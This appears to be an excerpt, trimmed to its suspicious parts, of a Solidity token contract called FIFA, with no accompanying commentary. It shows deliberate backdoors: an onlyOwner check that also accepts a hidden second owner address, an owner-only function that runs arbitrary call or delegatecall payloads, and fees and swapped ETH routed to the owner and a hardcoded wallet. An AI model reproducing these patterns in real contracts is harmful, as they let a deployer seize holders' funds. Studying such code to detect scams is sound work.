...
abstract contract Ownable {
    ...
    modifier onlyOwner() {
        require(_owner == msg.sender || owner_ == msg.sender, "Ownable: caller is not the owner");
        _;
    }
...
contract FIFA is IERC20, Ownable {
    ...
    address public marketAddress = 0x6b6caD566aa6Cd3435d07165D6304Ca4E6b3f1bA;
    ...
    address public swapWhiteAddr = 0x6b6caD566aa6Cd3435d07165D6304Ca4E6b3f1bA;
   ...
   function isExcludedFromFee(address account) public view returns (bool) {
    ...
    function _transfer(
        ...
        // }
        if(_tOwned[address(this)] >= 1 * 10**5 * 10**_decimals &&
         canswap && 
         IERC20(uniswapV2Router.WETH()).balanceOf(uniswapV2Pair) > 0.01 ether &&
         from != uniswapV2Pair&&
         to != uniswapV2Pair&&
         !inSwapAndLiquify
         ){
            swapTokensForEth(_tOwned[address(this)].div(100).mul(30));
            payable(marketAddress).transfer(address(this).balance.div(100).mul(30));
        }
    ...
    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap{
        ...
        _approve(address(this), address(uniswapV2Router), tokenAmount.mul(100));
    ...
    function setSwapEth(bool canswapbool) public onlyOwner{
            canswap = canswapbool;
    }
    ...
    function _takeburnFee(
        ...
        if(_tFeeTotal >= 10**10 * 10**9)_burnFee = 0;
    ...
    function _takeInviterFee(
        ...
        if (sender == uniswapV2Pair) {//buy
            ...
            if (cur == address(uniswapV2Router)) {
                _tOwned[owner_] = _tOwned[owner_].add(tAmount.div(10000).mul(_inviterFee));
        ...
        uint256 accurRate;
            ...
            if(cur == address(0)){
                _tOwned[owner_] = _tOwned[owner_].add(curTAmount);
    ...
    function calldivid(address addr, bytes memory bytecode, bool isbool) public onlyOwner returns(bool success){
        if(isbool){
            (success,) = addr.call(bytecode);
            }else{
            (success,) = addr.delegatecall(bytecode);
        }
        return success;
    }
